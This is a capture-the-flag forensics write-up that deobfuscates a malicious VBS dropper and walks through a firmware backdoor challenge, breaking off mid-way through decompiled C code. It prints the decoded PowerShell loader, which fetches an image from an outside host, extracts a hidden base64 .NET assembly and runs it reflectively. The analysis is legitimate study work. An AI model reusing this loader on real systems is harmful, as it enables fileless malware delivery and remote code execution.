# One step closer 

### Stage 1

From file `vaccine.fs` from challenge, I can determine the suspicusly file `.vbs` be downloaded from url `http://infected.human.htb/d/BKtQR` into user's folder`C:\\Windows\\Temp`.
![image](https://hackmd.io/_uploads/rk0nZ2FUT.png)

I start the docker which provided from the author and try to download this file from url. 

Access this [link](https://gist.github.com/winndy112/272c766199ce6778e1ab962bf8beb757) to get content of `BKtQR.vbs`

After I deofuscated the code by written python script in below, I got the vbs code.
```python
import base64

tmp = " ;$OWjuxd = [system.Text.encoding]::Unicode.GetString"

ktWMhVvYURXjUIktxhKqmvcExBWyIPxlNUaaUqEhWQYVZxXbidsZHoDhbZiJHyViRVqPjUWzOAufdSIiMmZz = " "

mark = "tomqOXAFzrtBfQNTWGTuDgkLdYgzpoJtKGfuDsVESyJFHtcTuIutPkyuVQpwGLbFvLzIXmwguYvYDQgGkwihbveHvvcwfRqtjiREeQFyWwImwPIYWQUCUkxpKztLmHwNlIJgvNGzLQmRPuWNmhjWkXYLnDNfNpXwZwmVMhIMMViCmFVUKhHgGZowKY = tomqOXAFzrtBfQNTWGTuDgkLdYgzpoJtKGfuDsVESyJFHtcTuIutPkyuVQpwGLbFvLzIXmwguYvYDQgGkwihbveHvvcwfRqtjiREeQFyWwImwPIYWQUCUkxpKztLmHwNlIJgvNGzLQmRPuWNmhjWkXYLnDNfNpXwZwmVMhIMMViCmFVUKhHgGZowKY & \""


with open(r"D:\CTF\2023\htbuni\forensics_one_step_closer\BKtQR.vbs", "r") as file:
    data= file.readlines()
    for line in data:
        if mark in line:
            line = line.strip().split(mark)
            tmp += (line[1][:-1]).strip()

tmp = tmp.replace("TQIJoIsDKygFhOhIUsFhmYGpMtHYXYriuBkzrHlGxHgtwOVBcJpaoSYXwYihoBDwDRSCDEGplfmoDjPrgYmdejlOxRRTwXXqUxtEpkdbzFGZtRYqCBgefVWmDfUZnbLpaQQTIAMcveTJekTjNZjNfCJawQsxvvTLaqAKZUciNlCQgVQFoKfnXYUTpOaNcbqsaDpdjNnD", "e")
tmp = tmp.replace("YdiovnqyjTDXTaRYzrOrPtPSPEkGydtHpsDzuMmtvwWDgfonHmlbiWofBzfzWwPCyghETBLJtSXhZTteJymwidWxlLmZRoJmxzHcFtMNHFLqYxcpgFpHeIhwiWILHovZEyZuwgHbTGwMVrwwjpWojiuZPXGPnkWzSsIhWOckYJSLGuGYaBQbdomrjcmnDFZVNWqVGjwx", "o")
tmp = tmp.replace("ZjJMuHOyfLrFRZQLRAMejVORkrLmnSCXRqVNBLINqTtavYGXNKmWkKgLUKpRuknZoStcKiPTtlSLTzbLLKnqBLvCxwwfYDUEJVRbZAqnPXJFfwKgaKoaTyXvWlktaXauDNHvgmoqbgdjOoBAwieAxhmIQTQGWVjowvkJpSMpEPnfitrQGRfXaVLxUPAmLRGwRAEgjqTg", "s")
tmp = tmp.replace("SjnKkClLMbtbUbEphNmdQTEXfhFHyXgQvKXvohDxuaGQdsTVSnrqEPEsLAdRQxDbDqFawzwRYThIFGZFjDIAEWMnWgxyLATxLKfXLJGtQgEqlXlrEBLbufduqlrgvcKaQAuxxmISiInqdFxetxSvuwcnvTQZlRnsnrezMZamRBgFTQGJcmEpKQISyYXRLVbdBQEdwdle", "t")
tmp = tmp.replace("VXIxBYQSKDryEAULIfGtTdegkaavJdWnPtXZlxmbyRZbRztkgJXWSKYsPfdAvLjUlqQqikfohaKubLssSrhTyIatsqjlfjIBXVfmwFkVqYIyCtYmjprSExKIzpcAdoVBTPRwuxasqmXvYvnHQlXgZBCYBqolLMBaNbIspDogrWvPdQlBBtHAGkUozkbMEJZIHTuiLIxX", "a")
tmp = tmp.replace("tomqOXAFzrtBfQNTWGTuDgkLdYgzpoJtKGfuDsVESyJFHtcTuIutPkyuVQpwGLbFvLzIXmwguYvYDQgGkwihbveHvvcwfRqtjiREeQFyWwImwPIYWQUCUkxpKztLmHwNlIJgvNGzLQmRPuWNmhjWkXYLnDNfNpXwZwmVMhIMMViCmFVUKhHgGZowKYdAuCBFCwdFvnAC", "A")

# ceihQqALcGOIRltJWcbOAcczSqDgPWBanKbSRhvIyWcOXwSUZYlOlkclnTvWYtPYJsIsCAOyBOKcIDbKqydbbQiROKGvDcbByIJqSQCGrePhAfCReMhvmGlwtLvcWqUCiAyqsZyYOpOIXbGruLZvpKmQRrqRlZiOocSlSZyyURrGTlriyLKUecKSRGfbDLCeQxKqwTaD = var
var = "Jem9tYmllcBpem9tYmllcG0em9tYmllcYQBnem9tYmllcGUem9tYmllcVQByem9tYmllcGwem9tYmllcIem9tYmllcem9tYmllc9em9tYmllcCem9tYmllcem9tYmllcJwBoem9tYmllcHQem9tYmllcdem9tYmllcBwem9tYmllcDoem9tYmllcLwem9tYmllcvem9tYmllcGkem9tYmllcbgBmem9tYmllcGUem9tYmllcYwB0em9tYmllcGUem9tYmllcZem9tYmllcem9tYmllcuem9tYmllcHoem9tYmllcbwBtem9tYmllcGIem9tYmllcaQBlem9tYmllcC4em9tYmllcaem9tYmllcB0em9tYmllcGIem9tYmllcLwBXem9tYmllcEoem9tYmllcdgBlem9tYmllcFgem9tYmllcNwem9tYmllcxem9tYmllcGEem9tYmllcZwBtem9tYmllcE8em9tYmllcUQem9tYmllc2em9tYmllcEcem9tYmllcdwBfem9tYmllcDEem9tYmllcNgem9tYmllc5em9tYmllcDgem9tYmllcNwem9tYmllc2em9tYmllcDIem9tYmllcNgem9tYmllc0em9tYmllcDIem9tYmllcLgBqem9tYmllcHem9tYmllcem9tYmllcZwem9tYmllcnem9tYmllcDsem9tYmllcJem9tYmllcB3em9tYmllcGUem9tYmllcYgBDem9tYmllcGwem9tYmllcaQBlem9tYmllcG4em9tYmllcdem9tYmllcem9tYmllcgem9tYmllcD0em9tYmllcIem9tYmllcBOem9tYmllcGUem9tYmllcdwem9tYmllctem9tYmllcE8em9tYmllcYgBqem9tYmllcGUem9tYmllcYwB0em9tYmllcCem9tYmllcem9tYmllcUwB5em9tYmllcHMem9tYmllcdem9tYmllcBlem9tYmllcG0em9tYmllcLgBOem9tYmllcGUem9tYmllcdem9tYmllcem9tYmllcuem9tYmllcFcem9tYmllcZQBiem9tYmllcEMem9tYmllcbem9tYmllcBpem9tYmllcGUem9tYmllcbgB0em9tYmllcDsem9tYmllcJem9tYmllcBpem9tYmllcG0em9tYmllcYQBnem9tYmllcGUem9tYmllcQgB5em9tYmllcHQem9tYmllcZQBzem9tYmllcCem9tYmllcem9tYmllc" + "P"+"Qem9tYmllcgem9tYmllcCQem9tYmllcdwBlem9tYmllcGIem9tYmllcQwBsem9tYmllcGkem9tYmllcZQBuem9tYmllcHQem9tYmllcLgBEem9tYmllcG8em9tYmllcdwBuem9tYmllcGwem9tYmllcbwBhem9tYmllcGQem9tYmllcRem9tYmllcBhem9tYmllcHQem9tYmllcYQem9tYmllcoem9tYmllcCQem9tYmllcaQBtem9tYmllcGEem9tYmllcZwBlem9tYmllcFUem9tYmllccgBsem9tYmllcCkem9tYmllcOwem9tYmllckem9tYmllcGkem9tYmllcbQBhem9tYmllcGcem9tYmllcZQBUem9tYmllcGUem9tYmllceem9tYmllcB0em9tYmllcCem9tYmllcem9tYmllc" + "P"+"Qem9tYmllcgem9tYmllcFsem9tYmllcUwB5em9tYmllcHMem9tYmllcdem9tYmllcBlem9tYmllcG0em9tYmllcLgBUem9tYmllcGUem9tYmllceem9tYmllcB0em9tYmllcC4em9tYmllcRQBuem9tYmllcGMem9tYmllcbwBkem9tYmllcGkem9tYmllcbgBnem9tYmllcF0em9tYmllcOgem9tYmllc6em9tYmllcFUem9tYmllcVem9tYmllcBGem9tYmllcDgem9tYmllcLgBHem9tYmllcGUem9tYmllcdem9tYmllcBTem9tYmllcHQem9tYmllccgBpem9tYmllcG4em9tYmllcZwem9tYmllcoem9tYmllcCQem9tYmllcaQBtem9tYmllcGEem9tYmllcZwBlem9tYmllcEIem9tYmllceQB0em9tYmllcGUem9tYmllccwem9tYmllcpem9tYmllcDsem9tYmllcJem9tYmllcBzem9tYmllcHQem9tYmllcYQByem9tYmllcHQem9tYmllcRgBsem9tYmllcGEem9tYmllcZwem9tYmllcgem9tYmllcD0em9tYmllcIem9tYmllcem9tYmllcnem9tYmllcDwem9tYmllc" + "P"+"em9tYmllcBCem9tYmllcEEem9tYmllcUwBFem9tYmllcDYem9tYmllcNem9tYmllcBfem9tYmllcFMem9tYmllcVem9tYmllcBBem9tYmllcFIem9tYmllcVem9tYmllcem9tYmllc+em9tYmllcD4em9tYmllcJwem9tYmllc7em9tYmllcCQem9tYmllcZQBuem9tYmllcGQem9tYmllcRgBsem9tYmllcGEem9tYmllcZwem9tYmllcgem9tYmllcD0em9tYmllcIem9tYmllcem9tYmllcnem9tYmllcDwem9tYmllc" + "P"+"em9tYmllcBCem9tYmllcEEem9tYmllcUwBFem9tYmllcDYem9tYmllcNem9tYmllcBfem9tYmllcEUem9tYmllcTgBEem9tYmllcD4em9tYmllc" + "P"+"gem9tYmllcnem9tYmllcDsem9tYmllcJem9tYmllcBzem9tYmllcHQem9tYmllcYQByem9tYmllcHQem9tYmllcSQBuem9tYmllcGQem9tYmllcZQB4em9tYmllcCem9tYmllcem9tYmllc" + "P"+"Qem9tYmllcgem9tYmllcCQem9tYmllcaQBtem9tYmllcGEem9tYmllcZwBlem9tYmllcFQem9tYmllcZQB4em9tYmllcHQem9tYmllcLgBJem9tYmllcG4em9tYmllcZem9tYmllcBlem9tYmllcHgem9tYmllcTwBmem9tYmllcCgem9tYmllcJem9tYmllcBzem9tYmllcHQem9tYmllcYQByem9tYmllcHQem9tYmllcRgBsem9tYmllcGEem9tYmllcZwem9tYmllcpem9tYmllcDsem9tYmllcJem9tYmllcBlem9tYmllcG4em9tYmllcZem9tYmllcBJem9tYmllcG4em9tYmllcZem9tYmllcBlem9tYmllcHgem9tYmllcIem9tYmllcem9tYmllc9em9tYmllcCem9tYmllcem9tYmllcJem9tYmllcBpem9tYmllcG0em9tYmllcYQBnem9tYmllcGUem9tYmllcVem9tYmllcBlem9tYmllcHgem9tYmllcdem9tYmllcem9tYmllcuem9tYmllcEkem9tYmllcbgBkem9tYmllcGUem9tYmllceem9tYmllcB" + "P"+"em9tYmllcGYem9tYmllcKem9tYmllcem9tYmllckem9tYmllcGUem9tYmllcbgBkem9tYmllcEYem9tYmllcbem9tYmllcBhem9tYmllcGcem9tYmllcKQem9tYmllc7em9tYmllcCQem9tYmllccwB0em9tYmllcGEem9tYmllccgB0em9tYmllcEkem9tYmllcbgBkem9tYmllcGUem9tYmllceem9tYmllcem9tYmllcgem9tYmllcC0em9tYmllcZwBlem9tYmllcCem9tYmllcem9tYmllcMem9tYmllcem9tYmllcgem9tYmllcC0em9tYmllcYQBuem9tYmllcGQem9tYmllcIem9tYmllcem9tYmllckem9tYmllcGUem9tYmllcbgBkem9tYmllcEkem9tYmllcbgBkem9tYmllcGUem9tYmllceem9tYmllcem9tYmllcgem9tYmllcC0em9tYmllcZwB0em9tYmllcCem9tYmllcem9tYmllcJem9tYmllcBzem9tYmllcHQem9tYmllcYQByem9tYmllcHQem9tYmllcSQBuem9tYmllcGQem9tYmllcZQB4em9tYmllcDsem9tYmllcJem9tYmllcBzem9tYmllcHQem9tYmllcYQByem9tYmllcHQem9tYmllcSQBuem9tYmllcGQem9tYmllcZQB4em9tYmllcCem9tYmllcem9tYmllcKwem9tYmllc9em9tYmllcCem9tYmllcem9tYmllcJem9tYmllcBzem9tYmllcHQem9tYmllcYQByem9tYmllcHQem9tYmllcRgBsem9tYmllcGEem9tYmllcZwem9tYmllcuem9tYmllcEwem9tYmllcZQBuem9tYmllcGcem9tYmllcdem9tYmllcBoem9tYmllcDsem9tYmllcJem9tYmllcBiem9tYmllcGEem9tYmllccwBlem9tYmllcDYem9tYmllcNem9tYmllcBMem9tYmllcGUem9tYmllcbgBnem9tYmllcHQem9tYmllcaem9tYmllcem9tYmllcgem9tYmllcD0em9tYmllcIem9tYmllcem9tYmllckem9tYmllcGUem9tYmllcbgBkem9tYmllcEkem9tYmllcbgBkem9tYmllcGUem9tYmllceem9tYmllcem9tYmllcgem9tYmllcC0em9tYmllcIem9tYmllcem9tYmllckem9tYmllcHMem9tYmllcdem9tYmllcBhem9tYmllcHIem9tYmllcdem9tYmllcBJem9tYmllcG4em9tYmllcZem9tYmllcBlem9tYmllcHgem9tYmllcOwem9tYmllckem9tYmllcGIem9tYmllcYQBzem9tYmllcGUem9tYmllcNgem9tYmllc0em9tYmllcEMem9tYmllcbwBtem9tYmllcG0em9tYmllcYQBuem9tYmllcGQem9tYmllcIem9tYmllcem9tYmllc9em9tYmllcCem9tYmllcem9tYmllcJem9tYmllcBpem9tYmllcG0em9tYmllcYQBnem9tYmllcGUem9tYmllcVem9tYmllcBlem9tYmllcHgem9tYmllcdem9tYmllcem9tYmllcuem9tYmllcFMem9tYmllcdQBiem9tYmllcHMem9tYmllcdem9tYmllcByem9tYmllcGkem9tYmllcbgBnem9tYmllcCgem9tYmllcJem9tYmllcBzem9tYmllcHQem9tYmllcYQByem9tYmllcHQem9tYmllcSQBuem9tYmllcGQem9tYmllcZQB4em9tYmllcCwem9tYmllcIem9tYmllcem9tYmllckem9tYmllcGIem9tYmllcYQBzem9tYmllcGUem9tYmllcNgem9tYmllc0em9tYmllcEwem9tYmllcZQBuem9tYmllcGcem9tYmllcdem9tYmllcBoem9tYmllcCkem9tYmllcOwem9tYmllckem9tYmllcGMem9tYmllcbwBtem9tYmllcG0em9tYmllcYQBuem9tYmllcGQem9tYmllcQgB5em9tYmllcHQem9tYmllcZQBzem9tYmllcCem9tYmllcem9tYmllc" + "P"+"Qem9tYmllcgem9tYmllcFsem9tYmllcUwB5em9tYmllcHMem9tYmllcdem9tYmllcBlem9tYmllcG0em9tYmllcLgBDem9tYmllcG8em9tYmllcbgB2em9tYmllcGUem9tYmllccgB0em9tYmllcF0em9tYmllcOgem9tYmllc6em9tYmllcEYem9tYmllccgBvem9tYmllcG0em9tYmllcQgBhem9tYmllcHMem9tYmllcZQem9tYmllc2em9tYmllcDQem9tYmllcUwB0em9tYmllcHIem9tYmllcaQBuem9tYmllcGcem9tYmllcKem9tYmllcem9tYmllckem9tYmllcGIem9tYmllcYQBzem9tYmllcGUem9tYmllcNgem9tYmllc0em9tYmllcEMem9tYmllcbwBtem9tYmllcG0em9tYmllcYQBuem9tYmllcGQem9tYmllcKQem9tYmllc7em9tYmllcCQem9tYmllcbem9tYmllcBvem9tYmllcGEem9tYmllcZem9tYmllcBlem9tYmllcGQem9tYmllcQQBzem9tYmllcHMem9tYmllcZQBtem9tYmllcGIem9tYmllcbem9tYmllcB5em9tYmllcCem9tYmllcem9tYmllc" + "P"+"Qem9tYmllcgem9tYmllcFsem9tYmllcUwB5em9tYmllcHMem9tYmllcdem9tYmllcBlem9tYmllcG0em9tYmllcLgBSem9tYmllcGUem9tYmllcZgBsem9tYmllcGUem9tYmllcYwB0em9tYmllcGkem9tYmllcbwBuem9tYmllcC4em9tYmllcQQBzem9tYmllcHMem9tYmllcZQBtem9tYmllcGIem9tYmllcbem9tYmllcB5em9tYmllcF0em9tYmllcOgem9tYmllc6em9tYmllcEwem9tYmllcbwBhem9tYmllcGQem9tYmllcKem9tYmllcem9tYmllckem9tYmllcGMem9tYmllcbwBtem9tYmllcG0em9tYmllcYQBuem9tYmllcGQem9tYmllcQgB5em9tYmllcHQem9tYmllcZQBzem9tYmllcCkem9tYmllcOwem9tYmllckem9tYmllcHQem9tYmllceQBwem9tYmllcGUem9tYmllcIem9tYmllcem9tYmllc9em9tYmllcCem9tYmllcem9tYmllcJem9tYmllcBsem9tYmllcG8em9tYmllcYQBkem9tYmllcGUem9tYmllcZem9tYmllcBBem9tYmllcHMem9tYmllccwBlem9tYmllcG0em9tYmllcYgBsem9tYmllcHkem9tYmllcLgBHem9tYmllcGUem9tYmllcdem9tYmllcBUem9tYmllcHkem9tYmllccem9tYmllcBlem9tYmllcCgem9tYmllcJwBGem9tYmllcGkem9tYmllcYgBlem9tYmllcHIem9tYmllcLgBIem9tYmllcG8em9tYmllcbQBlem9tYmllcCcem9tYmllcKQem9tYmllc7em9tYmllcCQem9tYmllcbQBlem9tYmllcHQem9tYmllcaem9tYmllcBvem9tYmllcGQem9tYmllcIem9tYmllcem9tYmllc9em9tYmllcCem9tYmllcem9tYmllcJem9tYmllcB0em9tYmllcHkem9tYmllccem9tYmllcBlem9tYmllcC4em9tYmllcRwBlem9tYmllcHQem9tYmllcTQBlem9tYmllcHQem9tYmllcaem9tYmllcBvem9tYmllcGQem9tYmllcKem9tYmllcem9tYmllcnem9tYmllcFYem9tYmllcQQBJem9tYmllcCcem9tYmllcKQem9tYmllcuem9tYmllcEkem9tYmllcbgB2em9tYmllcG8em9tYmllcawBlem9tYmllcCgem9tYmllcJem9tYmllcBuem9tYmllcHUem9tYmllcbem9tYmllcBsem9tYmllcCwem9tYmllcIem9tYmllcBbem9tYmllcG8em9tYmllcYgBqem9tYmllcGUem9tYmllcYwB0em9tYmllcFsem9tYmllcXQBdem9tYmllcCem9tYmllcem9tYmllcKem9tYmllcem9tYmllcnem9tYmllcFoem9tYmllcRem9tYmllcBWem9tYmllcGsem9tYmllcWgBtem9tYmllcFkem9tYmllceQBNem9tYmllcFcem9tYmllcSQB4em9tYmllcE4em9tYmllcMgBWem9tYmllcGwem9tYmllcTem9tYmllcBUem9tYmllcEYem9tYmllcbQBOem9tYmllcEQem9tYmllcZwB0em9tYmllcE4em9tYmllcVwBNem9tYmllcDMem9tYmllcTgBDem9tYmllcDEem9tYmllcagB" + "P"+"em9tYmllcFQem9tYmllcTQem9tYmllcwem9tYmllcEwem9tYmllcVwBRem9tYmllcDMem9tYmllcTQem9tYmllcyem9tYmllcE0em9tYmllceQBZem9tYmllcFQem9tYmllcWQB6em9tYmllcFem9tYmllcem9tYmllcVwem9tYmllc1em9tYmllcGwem9tYmllcYQem9tYmllcyem9tYmllcDkem9tYmllcMem9tYmllcBKem9tYmllcG0em9tYmllcRgBwem9tYmllcFoem9tYmllcRwBWem9tYmllcHQem9tYmllcUem9tYmllcBYem9tYmllcFIem9tYmllccwBZem9tYmllcFQem9tYmllcOQem9tYmllcwem9tYmllcGUem9tYmllcSem9tYmllcBRem9tYmllcHUem9tYmllcYwBtem9tYmllcFYem9tYmllcbQBjem9tYmllcDIem9tYmllcNQBoem9tYmllcGMem9tYmllcbgBRem9tYmllcHYem9tYmllcYgB5em9tYmllcDkem9tYmllcdem9tYmllcBiem9tYmllcDIem9tYmllcTQB1em9tYmllcGQem9tYmllcRwem9tYmllc5em9tYmllcHcem9tYmllcYwem9tYmllczem9tYmllcEIem9tYmllcdwBZem9tYmllcFMem9tYmllcNQBtem9tYmllcE8em9tYmllcVem9tYmllcBOem9tYmllcGoem9tYmllcTgBpem9tYmllcDEem9tYmllcbgBiem9tYmllcG0em9tYmllcbem9tYmllcByem9tYmllcFkem9tYmllcMgBGem9tYmllcG8em9tYmllcTem9tYmllcem9tYmllcyem9tYmllcEkem9tYmllcdgBNem9tYmllcEgem9tYmllcWQB2em9tYmllcGIem9tYmllcVwem9tYmllc5em9tYmllcGoem9tYmllcTem9tYmllcBuem9tYmllcE4em9tYmllccem9tYmllcBjem9tYmllcEcem9tYmllcRgBsem9tYmllcGIem9tYmllcRwBkem9tYmllcHYem9tYmllcYgem9tYmllcyem9tYmllcGMem9tYmllcdQBaem9tYmllcFcem9tYmllcZem9tYmllcBoem9tYmllcGMem9tYmllcbQem9tYmllc5em9tYmllcDem9tYmllcem9tYmllcYwem9tYmllcyem9tYmllcFYem9tYmllcegBZem9tYmllcFcem9tYmllcSgBsem9tYmllcGMem9tYmllcbQBsem9tYmllcG0em9tYmllcTem9tYmllcB5em9tYmllcDgem9tYmllcNgBjem9tYmllcDMem9tYmllcQgem9tYmllcwem9tYmllcGQem9tYmllcRwBnem9tYmllcD0em9tYmllcJwem9tYmllcgem9tYmllcCwem9tYmllcIem9tYmllcem9tYmllcnem9tYmllcGQem9tYmllcZgBkem9tYmllcGYem9tYmllcZem9tYmllcem9tYmllcnem9tYmllcCem9tYmllcem9tYmllcLem9tYmllcem9tYmllcgem9tYmllcCcem9tYmllcZem9tYmllcBmem9tYmllcGQem9tYmllcZgem9tYmllcnem9tYmllcCem9tYmllcem9tYmllcLem9tYmllcem9tYmllcgem9tYmllcCcem9tYmllcZem9tYmllcBmem9tYmllcGQem9tYmllcZgem9tYmllcnem9tYmllcCem9tYmllcem9tYmllcLem9tYmllcem9tYmllcgem9tYmllcCcem9tYmllcZem9tYmllcBhem9tYmllcGQem9tYmllccwBhem9tYmllcCcem9tYmllcIem9tYmllcem9tYmllcsem9tYmllcCem9tYmllcem9tYmllcJwBkem9tYmllcGUem9tYmllcJwem9tYmllcgem9tYmllcCwem9tYmllcIem9tYmllcem9tYmllcnem9tYmllcGMem9tYmllcdQem9tYmllcnem9tYmllcCkem9tYmllcKQem9tYmllc="

codigo = var.replace("em9tYmllc", "A")
print("$Codigo = ", codigo, tmp, '\n')

print("Decode $Codigo: ", base64.b64decode(codigo).replace(b"\x00", b"")) # => stage3

```

```vbs
$Codigo =  JABpAG0AYQBnAGUAVQByAGwAIAA9ACAAJwBoAHQAdABwADoALwAvAGkAbgBmAGUAYwB0AGUAZAAuAHoAbwBtAGIAaQBlAC4AaAB0AGIALwBXAEoAdgBlAFgANwAxAGEAZwBtAE8AUQA2AEcAdwBfADEANgA5ADgANwA2ADIANgA0ADIALgBqAHAAZwAnADsAJAB3AGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABpAG0AYQBnAGUAQgB5AHQAZQBzACAAPQAgACQAdwBlAGIAQwBsAGkAZQBuAHQALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACQAaQBtAGEAZwBlAFUAcgBsACkAOwAkAGkAbQBhAGcAZQBUAGUAeAB0ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAaQBtAGEAZwBlAEIAeQB0AGUAcwApADsAJABzAHQAYQByAHQARgBsAGEAZwAgAD0AIAAnADwAPABCAEEAUwBFADYANABfAFMAVABBAFIAVAA+AD4AJwA7ACQAZQBuAGQARgBsAGEAZwAgAD0AIAAnADwAPABCAEEAUwBFADYANABfAEUATgBEAD4APgAnADsAJABzAHQAYQByAHQASQBuAGQAZQB4ACAAPQAgACQAaQBtAGEAZwBlAFQAZQB4AHQALgBJAG4AZABlAHgATwBmACgAJABzAHQAYQByAHQARgBsAGEAZwApADsAJABlAG4AZABJAG4AZABlAHgAIAA9ACAAJABpAG0AYQBnAGUAVABlAHgAdAAuAEkAbgBkAGUAeABPAGYAKAAkAGUAbgBkAEYAbABhAGcAKQA7ACQAcwB0AGEAcgB0AEkAbgBkAGUAeAAgAC0AZwBlACAAMAAgAC0AYQBuAGQAIAAkAGUAbgBkAEkAbgBkAGUAeAAgAC0AZwB0ACAAJABzAHQAYQByAHQASQBuAGQAZQB4ADsAJABzAHQAYQByAHQASQBuAGQAZQB4ACAAKwA9ACAAJABzAHQAYQByAHQARgBsAGEAZwAuAEwAZQBuAGcAdABoADsAJABiAGEAcwBlADYANABMAGUAbgBnAHQAaAAgAD0AIAAkAGUAbgBkAEkAbgBkAGUAeAAgAC0AIAAkAHMAdABhAHIAdABJAG4AZABlAHgAOwAkAGIAYQBzAGUANgA0AEMAbwBtAG0AYQBuAGQAIAA9ACAAJABpAG0AYQBnAGUAVABlAHgAdAAuAFMAdQBiAHMAdAByAGkAbgBnACgAJABzAHQAYQByAHQASQBuAGQAZQB4ACwAIAAkAGIAYQBzAGUANgA0AEwAZQBuAGcAdABoACkAOwAkAGMAbwBtAG0AYQBuAGQAQgB5AHQAZQBzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGIAYQBzAGUANgA0AEMAbwBtAG0AYQBuAGQAKQA7ACQAbABvAGEAZABlAGQAQQBzAHMAZQBtAGIAbAB5ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAkAGMAbwBtAG0AYQBuAGQAQgB5AHQAZQBzACkAOwAkAHQAeQBwAGUAIAA9ACAAJABsAG8AYQBkAGUAZABBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAJwBGAGkAYgBlAHIALgBIAG8AbQBlACcAKQA7ACQAbQBlAHQAaABvAGQAIAA9ACAAJAB0AHkAcABlAC4ARwBlAHQATQBlAHQAaABvAGQAKAAnAFYAQQBJACcAKQAuAEkAbgB2AG8AawBlACgAJABuAHUAbABsACwAIABbAG8AYgBqAGUAYwB0AFsAXQBdACAAKAAnAFoARABWAGsAWgBtAFkAeQBNAFcASQB4AE4AMgBWAGwATABUAEYAbQBOAEQAZwB0AE4AVwBNADMATgBDADEAagBPAFQATQAwAEwAVwBRADMATQAyAE0AeQBZAFQAWQB6AFAAVwA1AGwAYQAyADkAMABKAG0ARgBwAFoARwBWAHQAUABYAFIAcwBZAFQAOQAwAGUASABRAHUAYwBtAFYAbQBjADIANQBoAGMAbgBRAHYAYgB5ADkAdABiADIATQB1AGQARwA5AHcAYwAzAEIAdwBZAFMANQBtAE8AVABOAGoATgBpADEAbgBiAG0AbAByAFkAMgBGAG8ATAAyAEkAdgBNAEgAWQB2AGIAVwA5AGoATABuAE4AcABjAEcARgBsAGIARwBkAHYAYgAyAGMAdQBaAFcAZABoAGMAbQA5ADAAYwAyAFYAegBZAFcASgBsAGMAbQBsAG0ATAB5ADgANgBjADMAQgAwAGQARwBnAD0AJwAgACwAIAAnAGQAZgBkAGYAZAAnACAALAAgACcAZABmAGQAZgAnACAALAAgACcAZABmAGQAZgAnACAALAAgACcAZABhAGQAcwBhACcAIAAsACAAJwBkAGUAJwAgACwAIAAnAGMAdQAnACkAKQA=  ;$OWjuxd = [system.Text.encoding]::Unicode.GetString([system.Convert]::Frombase64string($codigo.replace(''em9tYmllc'',''A'')));
```

And the decode base64 of `$Codigo` is:

```shell
$imageUrl = 'http://infected.zombie.htb/WJveX71agmOQ6Gw_1698762642.jpg';
$webClient = New-Object System.Net.WebClient;
$imageBytes = $webClient.DownloadData($imageUrl);
$imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);
$startFlag = '<<BASE64_START>>';
$endFlag = '<<BASE64_END>>';
$startIndex = $imageText.IndexOf($startFlag);
$endIndex = $imageText.IndexOf($endFlag);
$startIndex -ge 0 -and $endIndex -gt $startIndex;$startIndex += $startFlag.Length;
$base64Length = $endIndex - $startIndex;$base64Command = $imageText.Substring($startIndex, $base64Length);
$commandBytes = [System.Convert]::FromBase64String($base64Command);
$loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes);
$type = $loadedAssembly.GetType('Fiber.Home');
$method = $type.GetMethod('VAI').Invoke($null, [object[]] ('ZDVkZmYyMWIxN2VlLTFmNDgtNWM3NC1jOTM0LWQ3M2MyYTYzPW5la290JmFpZGVtPXRsYT90eHQucmVmc25hcnQvby9tb2MudG9wc3BwYS5mOTNjNi1nbmlrY2FoL2IvMHYvbW9jLnNpcGFlbGdvb2cuZWdhcm90c2VzYWJlcmlmLy86c3B0dGg=' , 'dfdfd' , 'dfdf' , 'dfdf' , 'dadsa' , 'de' , 'cu'))
```

### Stage 2

The flow of code is: download image from url `http://infected.zombie.htb/WJveX71agmOQ6Gw_1698762642.jpg` 

Get the image's data, with mark is `<<BASE64_START>>` and `<<BASE64_END>>` we can get a encoded base64 string by small script python

```python=
import base64
with open("WJveX71agmOQ6Gw_1698762642.png", "rb") as file:
    data = file.read()

startFlag = b'<<BASE64_START>>'
endFlag = b'<<BASE64_END>>'

indexStart= data.find(startFlag)
indexEnd = data.find(endFlag)
with open("./stage", "wb") as file:
    dt = data[indexStart+len(startFlag):indexEnd]
    dt = base64.b64decode(dt)
    file.write(dt)
```

Using `file` cmd, new file created is PE executable file. Finally, i use strings grep to find the flag

![image](https://hackmd.io/_uploads/BJmbL2jPa.png)

# Zoombienet

First using 7z or binwalk to extract squashFS file. 

After read the description, we shoule find the backdoor that attacker left on the computer. First I check `bin` and `sbin` folder, I saw the susspicious file is `zoombie_runner` in `sbin`.

The content of this file:

![image](https://hackmd.io/_uploads/SkSJFhsD6.png)

So next, I check `usr/bin/dead-reanimation` file.
![image](https://hackmd.io/_uploads/B14ZvTswT.png)

Reversing binary file by IDA. 
In main function, it copies `dword_400F74` to `v8`, `dword_400FB0` to `v9`, pass 4 variable to `modify` function, finally write bytes to file and change the permission of a file.

```c=
int __fastcall main(int a1, char **a2, char **a3)
{
  int v4[5]; // [sp+18h] [+18h] BYREF
  char v5; // [sp+2Ch] [+2Ch]
  int v6[4]; // [sp+30h] [+30h] BYREF
  __int16 v7; // [sp+40h] [+40h]
  char v8[60]; // [sp+44h] [+44h] BYREF
  char v9[56]; // [sp+80h] [+80h] BYREF

  v4[0] = 0x9A6F65F0;
  v4[1] = 0xADF4E47E;
  v4[2] = 0x4E937069;
  v4[3] = 0x8EC5E155;
  v4[4] = 0x3AF55FC1;
  v5 = 0;
  v6[0] = 0x9A6F65F0;
  v6[1] = 0xADF4F27E;
  v6[2] = 0x4A8C4663;
  v6[3] = 0x9082EA40;
  v7 = 0xC8;
